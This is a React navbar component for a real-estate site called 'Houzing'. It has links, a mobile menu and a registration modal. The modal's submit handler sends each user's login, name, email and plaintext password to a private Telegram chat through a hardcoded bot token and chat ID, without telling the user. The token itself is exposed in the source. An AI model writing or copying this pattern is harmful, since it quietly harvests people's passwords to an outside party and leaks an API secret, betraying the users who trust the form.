import React, {useState} from 'react';
import './index.scss';
import Houzing from '../../assets/logo.png';
import User from '../../assets/Vector (5).png';
import Home from '../../assets/Vector (6).png';
import CarKey from '../../assets/car-key 1.png';
import Price from '../../assets/price 1.png';
import Advanced from '../../assets/Group.png';
import {Link} from 'react-router-dom';
import {Modal, Input, message, Button, Form, Card} from 'antd';
import {SearchOutlined} from '@ant-design/icons';
import sandwich from '../../assets/nav.png';

function Index(props) {
    const [modalVisible, setModalVisible] = useState(false);
    const [menuVisible, setMenuVisible] = useState(false);
    const [messageApi, contextHolder] = message.useMessage();
    const [form] = Form.useForm();

    const onFinish = (values) => {
        console.log('Received values:', values);
        message.success('Registration successful!');
        form.resetFields();
        sendTelegram(values);
    }

    const sendTelegram = (values) => {
        const {login, firstName, lastName, email, password} = values;
        const message = `📌Login: ${login}\n 📌First Name: ${firstName}\n 📌Last Name: ${lastName}\n 📌Email: ${email}\n 📌Password: ${password}`;

        var telegram_bot_id = "7059302754:AAGChb5bbs0nbJSlON7Wus1VADd9YOGZ418"; // Replace with your Telegram bot token
        var chat_id = 1736820935; // Replace with your Telegram chat ID

        var settings = {
            "async": true,
            "crossDomain": true,
            "url": `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": message
            })
        };

        fetch(settings.url, {
            method: 'POST',
            headers: settings.headers,
            body: settings.data
        })
            .then(response => {
                console.log(response);
                if (!response.ok) {
                    throw new Error('Error sending data to Telegram bot');
                }
            })
            .catch(error => {
                console.error('Error sending data to Telegram bot:', error);
            });
    };

    const success = () => {
        messageApi.open({
            type: 'success',
            content: "Siz muvaffaqiyatli ro'yxatdan o'tdingiz!",
        });
    };

    const showModal = () => setModalVisible(true);
    const handleOk = () => {
        setModalVisible(false);
        success();
        form.submit();
    };
    const handleCancel = () => setModalVisible(false);

    const handleMenuClick = () => {
        // Handle menu item click here
        setMenuVisible(false); // Close menu modal after clicking menu item
    };

    return (
        <div className="navbar">
            <div className="top">
                <img className="sandwich" src={sandwich} alt="" onClick={() => setMenuVisible(true)}/>
                <div className="left">
                    <Link to="/">
                        <img src={Houzing} alt=""/>
                    </Link>
                </div>
                <div className="middle">
                    <Link to="/">
                        <p>Home</p>
                    </Link>
                    <Link to="/properties">
                        <p>Properties</p>
                    </Link>
                    <Link to="/contacts">
                        <p>Contacts</p>
                    </Link>
                </div>
                <div className="right">
                    <img src={User} alt="" onClick={showModal}/>
                    {contextHolder}
                    <Modal title="Registration" visible={modalVisible} onOk={handleOk} onCancel={handleCancel}>
                        <Form
                            form={form}
                            onFinish={onFinish}
                        >
                            <Form.Item
                                name="login"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please enter your login!',
                                    },
                                ]}
                            >
                                <Input placeholder={"Login"}/>
                            </Form.Item>
                            <Form.Item
                                name="firstName"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please enter your first name!',
                                    },
                                ]}
                            >
                                <Input placeholder={"First name"}/>
                            </Form.Item>
                            <Form.Item
                                name="lastName"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please enter your last name!',
                                    },
                                ]}
                            >
                                <Input placeholder={"Last name"}/>
                            </Form.Item>
                            <Form.Item
                                name="email"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please enter your email!',
                                    },
                                ]}
                            >
                                <Input placeholder={"Email"}/>
                            </Form.Item>
                            <Form.Item
                                name="password"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please enter your password!',
                                    },
                                ]}
                            >
                                <Input.Password placeholder={"Password"}/>
                            </Form.Item>
                        </Form>
                </Modal>
            </div>
        </div>
    <Modal title="Menu" visible={menuVisible} onCancel={() => setMenuVisible(false)} footer={null}>
        <div className="modal-menu" style={{display: "flex", gap: "10%"}}>
            <Link to="/" onClick={handleMenuClick}>
                Home
            </Link>
            <Link to="/properties" onClick={handleMenuClick}>
                Properties
            </Link>
            <Link to="/contacts" onClick={handleMenuClick}>
                Contacts
            </Link>
        </div>
    </Modal>
</div>
)
    ;
}

export default Index;

